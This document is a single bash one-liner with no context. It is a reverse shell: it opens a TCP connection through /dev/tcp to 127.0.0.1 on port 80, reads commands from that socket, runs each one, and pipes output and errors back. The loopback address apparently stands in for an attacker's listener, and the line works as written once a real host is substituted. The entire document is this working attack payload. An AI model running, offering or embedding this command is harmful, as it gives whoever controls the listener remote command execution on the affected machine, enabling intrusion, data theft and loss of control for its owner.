exec 5<>/dev/tcp/127.0.0.1/80; cat <&5 | while read line; do $line 2>&5 1>&5; done
